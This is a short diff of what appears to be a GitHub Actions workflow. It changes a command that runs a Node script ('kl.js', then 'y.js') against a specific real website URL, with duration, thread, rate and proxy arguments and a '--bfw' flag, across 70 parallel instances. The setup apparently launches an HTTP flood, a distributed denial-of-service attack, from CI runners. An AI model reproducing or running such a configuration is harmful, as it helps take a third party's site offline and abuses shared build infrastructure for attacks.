@@ -41,7 +41,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          node kl.js GET https://tw-masterclass.com/page_ufchq/ 300 4 120 proxy.txt
+          node y.js GET https://tw-masterclass.com/page_ufchq/ 300 4 90 --bfw --debug 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
